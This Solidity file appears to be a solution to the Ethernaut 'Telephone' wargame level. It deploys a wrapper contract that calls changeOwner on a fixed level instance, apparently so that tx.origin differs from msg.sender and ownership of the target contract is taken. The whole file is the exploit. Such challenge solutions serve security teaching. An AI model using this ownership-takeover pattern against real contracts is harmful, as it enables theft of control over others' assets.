// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "ethernaut/Telephone/Telephone.sol";

contract TelephoneWrapper {
    Telephone instance = Telephone(0xbCf724C9e37468fBCDd0a093203fe7f314121A58);

    function changeOwner(address _owner) public {
        instance.changeOwner(_owner);
    }
}
